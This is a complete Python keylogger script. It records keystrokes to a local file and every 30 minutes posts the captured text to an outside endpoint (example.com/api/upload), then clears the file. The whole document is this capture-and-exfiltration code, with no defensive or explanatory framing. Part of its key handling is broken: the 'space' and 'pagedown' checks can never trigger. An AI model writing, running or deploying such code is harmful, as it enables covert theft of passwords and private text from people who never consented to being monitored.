import requests
import keyboard
import time

FILENAME = "what-i-type.txt"
API_ENDPOINT = "http://example.com/api/upload"


def capture_input(event):
    """Capture the pressed keys and write them to a file."""
    if len(event.name) == 1:
        key_name = event.name
        with open(FILENAME, "a") as f:
            if key_name == "space":
                f.write(chr(32))
            else:
                f.write(key_name)
        if key_name == "pagedown":
            keyboard.unhook_all()


def send_file_contents():
    """Send the contents of the file to the API endpoint and clear the file."""
    with open(FILENAME, "r") as f:
        contents = f.read()
    if contents:
        response = requests.post(API_ENDPOINT, data=contents)
        if response.status_code == 200:
            with open(FILENAME, "w") as f:
                f.write("")  # clear the file


def main():
    """Start the keyboard listener and send the file contents every 30 minutes."""
    keyboard.on_press(capture_input)
    while True:
        time.sleep(1800)  # wait for 30 minutes
        send_file_contents()


if __name__ == "__main__":
    main()
